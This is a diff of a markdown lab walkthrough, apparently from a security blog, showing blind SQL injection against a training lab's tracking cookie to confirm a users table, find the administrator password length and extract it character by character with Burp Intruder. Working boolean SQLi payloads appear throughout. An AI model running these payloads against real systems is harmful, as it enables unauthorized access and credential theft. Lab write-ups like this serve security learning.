@@ -51,12 +51,13 @@ This confirms the parameter is vulnerable to Blind SQL Injection.
 
 
 ### 2. Confirm the users table exists
----
 
+---sql
 'select tracking-id from tracking-table 
 'where trackingId = 'RvLfBu6s9EZRlVYN' 
 'and (select 'x' from users LIMIT 1)='x'-- 
 ---
+
 <div style="text-align: center;">
   <img src="/top10-owasp-blog/assets/images/wu2.png" alt="SQL Injection Diagram" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
   <p><em>Figure 1: </em> Tested the cookie value </p>
@@ -79,7 +80,8 @@ and (select username from users where username='administrator')='administrator'-
 </div>
 
 ### 4. Determine the password length
----
+
+---sql
 ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator'--
 ---
 
@@ -104,7 +106,8 @@ By adjusting the number in LENGTH(password)=X and observing the response, you ca
 -Go to the Payloads tab.
 -Set the payload type to Simple list.
 -Enter all possible characters:
----
+
+---sql
 'abcdefghijklmnopqrstuvwxyz
 'ABCDEFGHIJKLMNOPQRSTUVWXYZ
 '0123456789
@@ -113,10 +116,11 @@ By adjusting the number in LENGTH(password)=X and observing the response, you ca
 * Run the attack for each character position
 
 Start with position 1:
----
 
+---sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='§a§'--
 ---
+
 ==> Look at the Length or Response column in the Intruder results, If it’s longer or contains "Welcome back", that character is correct and repeat for positions 1 → 20.
 Write down each discovered character in order until you have all 20.
 
@@ -127,9 +131,11 @@ Example found password in my lab :
 ### 6.Verify the password
 
 Use Burp Repeater to check if it matches the administrator account:
----
+
+---sql
 ' AND SUBSTRING((SELECT username FROM users WHERE password='52rabjtjpa749cy0bvo6'),1,1)='a'--
 ---
+
 ==> If it returns the "Welcome back" message → the password is correct , and you can test
 in lab with Username: administrator and Password: 52rabjtjpa749cy0bvo6
 
